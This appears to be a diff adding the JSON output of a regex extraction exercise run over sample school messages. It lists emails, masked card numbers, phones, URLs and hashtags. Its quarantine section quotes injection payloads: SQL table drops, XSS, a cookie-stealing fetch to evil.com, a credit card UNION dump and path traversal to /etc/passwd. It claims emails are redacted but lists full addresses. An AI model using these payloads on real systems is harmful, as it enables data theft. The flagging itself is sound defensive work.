@@ -1,0 +1,183 @@
+{
+  "metadata": {
+    "processed_at": "2026-05-24T21:21:03.527511+00:00",
+    "input_size_chars": 9595,
+    "hostile_lines_quarantined": 7,
+    "privacy_note": "Credit card PANs are masked to last 4 digits. Email local-parts are partially redacted."
+  },
+  "security": {
+    "quarantined_lines": [
+      {
+        "line_number": 162,
+        "preview": "Name: Robert'); DROP TABLE students; --"
+      },
+      {
+        "line_number": 168,
+        "preview": "Name: <script>alert('XSS Attack');</script>"
+      },
+      {
+        "line_number": 170,
+        "preview": "Message: <img src=x onerror=\"fetch('https://evil.com/?c='+document.cookie)\">"
+      },
+      {
+        "line_number": 175,
+        "preview": "Message: SELECT * FROM users WHERE email LIKE '%@alueducation.com' AND 1=1--"
+      },
+      {
+        "line_number": 181,
+        "preview": "Message: Please load file from ../../etc/passwd on the server."
+      },
+      {
+        "line_number": 182,
+        "preview": "Alt: ../../../windows/system32/config/sam"
+      },
+      {
+        "line_number": 196,
+        "preview": "Message: UNION SELECT credit_card, cvv FROM payment_records WHERE user_id=1 INTO OUTFILE '/tmp/dump.txt'"
+      }
+    ]
+  },
+  "extracted": {
+    "emails": {
+      "all": [
+        "al*********@alueducation.com",
+        "sa***********@gmail.com",
+        "re*******@alueducation.com",
+        "ja********@alumni.alueducation.com",
+        "j.***********@gmail.com",
+        "am**********@alueducation.com",
+        "pr**********@alueducation.com",
+        "kw**********@si.alueducation.com",
+        "si******@si.alueducation.com",
+        "fa************@alueducation.com",
+        "ol***********@alueducation.com",
+        "ou******@alueducation.com",
+        "di************@alumni.alueducation.com",
+        "ad********@alueducation.com",
+        "bo**********@example.com",
+        "xs******@example.com",
+        "va**********@gmail.com",
+        "ha****@notreal.io",
+        "r.*******@alueducation.com",
+        "te**@legitimate-domain.org",
+        "if********@si.alueducation.com",
+        "ca*********@example.com"
+      ],
+      "alu_official": [
+        "alex.murera@alueducation.com",
+        "registrar@alueducation.com",
+        "amara.diallo@alueducation.com",
+        "priya.sharma@alueducation.com",
+        "fatima.ibrahim@alueducation.com",
+        "olivier.nkusi@alueducation.com",
+        "outreach@alueducation.com",
+        "admissions@alueducation.com",
+        "r.okonkwo@alueducation.com"
+      ],
+      "alu_alumni": [
+        "james.osei@alumni.alueducation.com",
+        "diana.nyambura@alumni.alueducation.com"
+      ],
+      "alu_si": [
+        "kwame.asante@si.alueducation.com",
+        "si-coord@si.alueducation.com",
+        "ifeoma.eze@si.alueducation.com"
+      ],
+      "count": 22
+    },
+    "credit_cards": {
+      "masked_numbers": [
+        "**** **** **** 9012",
+        "**** **** **** 6354",
+        "**** **** **** 9424",
+        "**** **** **** 1111",
+        "**** **** **** 8431",
+        "**** **** **** 5100",
+        "**** **** **** 4444",
+        "**** **** **** 5556",
+        "**** **** **** 0005",
+        "**** **** **** 0002"
+      ],
+      "count": 10,
+      "note": "Full card numbers are discarded after masking — never stored or logged."
+    },
+    "urls": {
+      "safe": [
+        "https://portal.alueducation.com/payments/guide",
+        "https://portal.alueducation.com/errors/E-PAY-403",
+        "https://scholarships.alueducation.com/apply",
+        "https://www.alueducation.com/scholarships/merit-2026",
+        "https://alumni.alueducation.com/network",
+        "https://courses.alueducation.com/register?term=2026S",
+        "https://pay.alueducation.com/receipt/TXN-2026-001",
+        "https://pay.alueducation.com/receipt/TXN-2026-002",
+        "https://si.alueducation.com/projects/kwame-asante-2026",
+        "https://support.fintech-partner.io/cases/ERR-CVV-0391",
+        "https://pay.alueducation.com/receipt/TXN-2026-004",
+        "https://github.com/ALU-Cohort/hackathon-2026",
+        "https://donate.alueducation.com/students?campaign=hack2026",
+        "https://mentorship.alueducation.com/apply?cycle=2026",
+        "https://apply.alueducation.com",
+        "https://www.alueducation.com/scholarships",
+        "https://pay.alueducation.com/receipt/TXN-2026-099",
+        "https://si.alueducation.com/fellows/ifeoma-eze"
+      ],
+      "flagged": [],
+      "count": 18
+    },
+    "phone_numbers": [
+      "+250 788 456 789",
+      "+1 (617) 890-4321",
+      "+233 541-234567",
+      "0783-100-200",
+      "+254 712-345-678",
+      "+250 252 381 000",
+      "+256 752-111-222",
+      "0788-654-321",
+      "+255 654-987-654"
+    ],
+    "currency_amounts": [
+      "RWF 2,500,000",
+      "$5,000.00",
+      "EUR 150.00",
+      "KES 3,200",
+      "$3,800.00",
+      "$3,200.00",
+      "RWF 1,800,000",
+      "KES 85,000",
+      "$500.00",
+      "$50.00",
+      "RWF 750,000",
+      "NGN 150,000"
+    ],
+    "hashtags": [
+      "#TKT",
+      "#PaymentIssue",
+      "#ALU",
+      "#Urgent",
+      "#Scholarship",
+      "#ALUAfrica",
+      "#HigherEducation",
+      "#ALUAlumni",
+      "#NetworkAccess",
+      "#AlumniConnect",
+      "#Registration",
+      "#CourseIssue",
+      "#SocialInnovation",
+      "#ImpactProject",
+      "#Hackathon",
+      "#TechForGood",
+      "#RegexChallenge",
+      "#Innovation",
+      "#Leadership",
+      "#Africa2026",
+      "#Forbes30Under30",
+      "#Admissions",
+      "#StudyInAfrica",
+      "#Opportunity",
+      "#F",
+      "#StudentLife",
+      "#Nigeria"
+    ]
+  }
+}
